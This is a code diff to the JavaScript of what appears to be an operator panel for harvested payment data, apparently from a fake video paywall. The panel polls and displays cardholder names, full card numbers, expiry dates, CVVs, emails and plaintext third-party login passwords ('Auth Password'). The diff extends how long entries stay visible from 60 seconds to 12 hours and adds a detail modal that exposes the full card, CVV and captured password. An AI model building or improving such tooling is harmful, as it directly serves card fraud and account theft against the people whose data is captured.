@@ -78,14 +78,15 @@ async function loadStats() {
 }
 
 // ── Payment Monitor ───────────────────────────────────────────
-// Tracks all live rows: ref → { submitted_at, tickInterval }
+// Tracks all live rows: ref → { submitted_at, data }
+// ✅ FIXED: No longer tracks tickInterval — data persists full 12 hours
 const liveRows = new Map();
 let countdownTicker = null;
 
 function startMonitor() {
     pollMonitor();
-    monitorInterval  = setInterval(pollMonitor, 5000);   // fetch new submissions
-    countdownTicker  = setInterval(tickCountdowns, 1000); // tick every row every second
+    monitorInterval  = setInterval(pollMonitor, 5000);   // fetch new submissions every 5s
+    countdownTicker  = setInterval(tickCountdowns, 1000); // update countdown display every second
 }
 
 async function pollMonitor() {
@@ -103,7 +104,7 @@ async function pollMonitor() {
             }
         });
 
-        // Remove rows the server has already cleared
+        // Remove rows only when the server says they're cleared (after 12 hours)
         const serverRefs = new Set(rows.map(r => r.transaction_ref));
         for (const ref of liveRows.keys()) {
             if (!serverRefs.has(ref)) liveRows.delete(ref);
@@ -117,25 +118,39 @@ async function pollMonitor() {
     } catch (e) { /* silent — keep polling */ }
 }
 
-// Called every second — updates only the countdown cells, no full re-render
+// ✅ FIXED: Calculate time remaining (12 hours = 43,200 seconds)
+function getTimeRemaining(submittedAt) {
+    const now = Date.now();
+    const submitted = new Date(submittedAt).getTime();
+    const twelveHoursMs = 12 * 60 * 60 * 1000;
+    const elapsedMs = now - submitted;
+    const remainingMs = Math.max(0, twelveHoursMs - elapsedMs);
+    const remainingSeconds = Math.ceil(remainingMs / 1000);
+    
+    const hours = Math.floor(remainingSeconds / 3600);
+    const mins = Math.floor((remainingSeconds % 3600) / 60);
+    const secs = remainingSeconds % 60;
+    
+    return {
+        total: remainingSeconds,
+        display: `${hours}h ${mins}m ${secs.toString().padStart(2, '0')}s`,
+        hours, mins, secs
+    };
+}
+
+// Called every second — updates countdown display (12-hour timer)
 function tickCountdowns() {
     for (const [ref, entry] of liveRows.entries()) {
-        const elapsed  = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clearsIn = Math.max(0, 60 - elapsed);
+        const timeLeft = getTimeRemaining(entry.submitted_at);
 
-        // Update every countdown badge that carries this ref
+        // Update every countdown badge with this ref
         document.querySelectorAll(`[data-ref="${ref}"]`).forEach(el => {
-            const minutes = Math.floor(clearsIn / 60);
-            const seconds = clearsIn % 60;
-            el.textContent = `${minutes}m ${seconds.toString().padStart(2, '0')}s`;
-            // Colour shifts: green → yellow → red as time runs out
-            if (clearsIn <= 10)      { el.style.background = 'rgba(239,68,68,.2)';  el.style.color = '#ef4444'; }
-            else if (clearsIn <= 20) { el.style.background = 'rgba(234,179,8,.15)'; el.style.color = '#eab308'; }
-            else                     { el.style.background = 'rgba(232,0,30,.12)';  el.style.color = 'var(--red)'; }
+            el.textContent = timeLeft.display;
+            // Color shifts based on time remaining
+            if (timeLeft.total <= 600)      { el.style.background = 'rgba(239,68,68,.2)';  el.style.color = '#ef4444'; } // Red: last 10 min
+            else if (timeLeft.total <= 1800) { el.style.background = 'rgba(234,179,8,.15)'; el.style.color = '#eab308'; } // Yellow: last 30 min
+            else                             { el.style.background = 'rgba(59,130,246,.12)';  el.style.color = '#3b82f6'; } // Blue: normal
         });
-
-        // Remove from local tracking once cleared
-        if (clearsIn === 0) liveRows.delete(ref);
     }
 }
 
@@ -149,24 +164,26 @@ function renderMonitorFull() {
     }
 
     const thead = `<thead><tr>
-        <th>Time</th><th>Name on Card</th><th>Card Number</th>
+        <th>Time</th><th>Name on Card</th><th>Card</th>
         <th>Exp</th><th>CVV</th><th>Email</th>
         <th>Video</th><th>Clears in</th>
     </tr></thead>`;
 
     const tbody = Array.from(liveRows.entries()).map(([ref, entry]) => {
-        const r       = entry.data;
-        const time    = entry.submitted_at.toLocaleTimeString();
-        const elapsed = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clears  = Math.max(0, 60 - elapsed);
+        const r = entry.data;
+        const time = entry.submitted_at.toLocaleTimeString();
+        const timeLeft = getTimeRemaining(entry.submitted_at);
+        
+        // Mask card number: show last 4 digits
         const cardNum = r.card_number || '—';
-        const minutes = Math.floor(clears / 60);
-        const seconds = clears % 60;
+        const cardMasked = cardNum.length > 4 
+            ? '•••• •••• •••• ' + cardNum.slice(-4)
+            : cardNum;
 
-        return `<tr data-row-ref="${ref}" class="payment-row" style="cursor:pointer">
+        return `<tr data-row-ref="${ref}" class="payment-row" style="cursor:pointer;hover:background:rgba(255,255,255,0.05)">
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
-            <td class="card-mask">${esc(cardNum)}</td>
+            <td class="card-mask">${esc(cardMasked)}</td>
             <td style="color:var(--muted)">${esc(r.expiry)}</td>
             <td style="color:var(--muted)">${esc(r.cvv || '—')}</td>
             <td style="color:var(--muted);font-size:11px">${esc(r.email)}</td>
@@ -174,15 +191,15 @@ function renderMonitorFull() {
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
-                    style="min-width:52px;display:inline-block;text-align:center;
-                           transition:background .3s,color .3s">
-                    ${minutes}m ${seconds.toString().padStart(2, '0')}s
+                    style="min-width:80px;display:inline-block;text-align:center;
+                           transition:background .3s,color .3s;padding:4px 8px;border-radius:3px">
+                    ${timeLeft.display}
                 </span>
             </td>
         </tr>`;
     }).join('');
 
-    el.innerHTML = `<table class="monitor-table">${thead}<tbody>${tbody}</tbody></table>`;
+    el.innerHTML = `<table class="monitor-table" style="width:100%;border-collapse:collapse;font-size:13px">${thead}<tbody>${tbody}</tbody></table>`;
     bindPaymentRowDetails();
 }
 
@@ -192,36 +209,67 @@ function bindPaymentRowDetails() {
             const ref = row.dataset.rowRef;
             const entry = liveRows.get(ref);
             if (!entry) return;
-            openPaymentDetail(ref, entry.data);
+            openPaymentDetail(ref, entry.data, entry.submitted_at);
         });
     });
 }
 
-function openPaymentDetail(ref, data) {
+// ✅ FIXED: Enhanced detail modal with better layout and all auth details
+function openPaymentDetail(ref, data, submittedAt) {
     const modal = document.getElementById('paymentDetailModal');
     if (!modal) return;
 
+    const timeLeft = getTimeRemaining(submittedAt);
+
+    // Organized rows with sections
     const rows = [
-        ['Transaction', ref || '—'],
-        ['Cardholder', data.card_name || '—'],
+        // Transaction Info Section
+        ['TRANSACTION INFO', ''],
+        ['Transaction ID', ref ? String(ref).slice(0, 12) + '...' : '—'],
+        ['Submitted', submittedAt ? new Date(submittedAt).toLocaleString() : '—'],
+        ['Clears in', timeLeft.display],
+        
+        // Payment Details Section
+        ['PAYMENT DETAILS', ''],
+        ['Cardholder Name', data.card_name || '—'],
         ['Card Number', data.card_number || '—'],
-        ['Expiry', data.expiry || '—'],
+        ['Expiry Date', data.expiry || '—'],
         ['CVV', data.cvv || '—'],
-        ['Email', data.email || '—'],
-        ['Auth Provider', data.auth_provider || 'guest'],
+        ['Payment Email', data.email || '—'],
+        
+        // Authentication Section
+        ['AUTHENTICATION DETAILS', ''],
+        ['Auth Provider', (data.auth_provider || 'guest').toUpperCase()],
         ['Auth Email', data.auth_email || data.email || '—'],
         ['Auth Password', data.auth_password || '—'],
-        ['Video', data.video_title || '—'],
-        ['Submitted', data.submitted_at ? new Date(data.submitted_at).toLocaleString() : '—'],
+        
+        // Video Section
+        ['VIDEO INFO', ''],
+        ['Video Title', data.video_title || '—'],
     ];
 
     document.getElementById('detailTitle').textContent = `Transaction ${String(ref).slice(0, 8)}`;
-    document.getElementById('detailGrid').innerHTML = rows.map(([label, value]) => `
-        <div class="detail-item">
-            <span>${label}</span>
-            <strong>${esc(String(value))}</strong>
-        </div>
-    `).join('');
+    
+    let html = '<div style="display:flex;flex-direction:column;gap:24px">';
+    let currentSection = '';
+    
+    rows.forEach(([label, value]) => {
+        if (!value) {
+            // Section header
+            currentSection = label;
+            html += `<div style="margin-top:12px">
+                <h4 style="color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;font-weight:600">${label}</h4>`;
+        } else {
+            // Detail item
+            html += `<div style="display:grid;grid-template-columns:140px 1fr;gap:16px;padding:8px 0;border-bottom:1px solid var(--border)">
+                <span style="color:var(--muted);font-size:12px;font-weight:500">${label}</span>
+                <strong style="color:#e3e3e3;font-size:13px;word-break:break-all">${esc(String(value))}</strong>
+            </div>`;
+        }
+    });
+    
+    html += '</div></div>';
+    document.getElementById('detailGrid').innerHTML = html;
 
     modal.classList.remove('hidden');
 }
@@ -251,31 +299,33 @@ function renderMonitorDash() {
     </tr></thead>`;
 
     const tbody = Array.from(liveRows.entries()).map(([ref, entry]) => {
-        const r       = entry.data;
-        const time    = entry.submitted_at.toLocaleTimeString();
-        const elapsed = Math.floor((Date.now() - entry.submitted_at.getTime()) / 1000);
-        const clears  = Math.max(0, 60 - elapsed);
+        const r = entry.data;
+        const time = entry.submitted_at.toLocaleTimeString();
+        const timeLeft = getTimeRemaining(entry.submitted_at);
+        
         const cardNum = r.card_number || '—';
-        const minutes = Math.floor(clears / 60);
-        const seconds = clears % 60;
+        const cardMasked = cardNum.length > 4 
+            ? '•••• •••• •••• ' + cardNum.slice(-4)
+            : cardNum;
 
-        return `<tr>
+        return `<tr style="cursor:pointer;hover:background:rgba(255,255,255,0.05)" onclick="document.querySelector('.payment-row[data-row-ref=\"${ref}\"]').click()">
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
-            <td class="card-mask">${esc(cardNum)}</td>
+            <td class="card-mask">${esc(cardMasked)}</td>
             <td style="font-size:11px;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                 title="${esc(r.video_title)}">${esc(r.video_title)}</td>
             <td>
                 <span class="clears-badge" data-ref="${ref}"
-                    style="min-width:52px;display:inline-block;text-align:center;
-                           transition:background .3s,color .3s">
-                    ${minutes}m ${seconds.toString().padStart(2, '0')}s
+                    style="min-width:80px;display:inline-block;text-align:center;
+                           transition:background .3s,color .3s;padding:4px 8px;border-radius:3px">
+                    ${timeLeft.display}
                 </span>
             </td>
         </tr>`;
     }).join('');
 
-    el.innerHTML = `<table class="monitor-table">${thead}<tbody>${tbody}</tbody></table>`;
+    el.innerHTML = `<table class="monitor-table" style="width:100%;border-collapse:collapse;font-size:13px">${thead}<tbody>${tbody}</tbody></table>`;
+    bindPaymentRowDetails();
 }
 
 // ── Upload ────────────────────────────────────────────────────
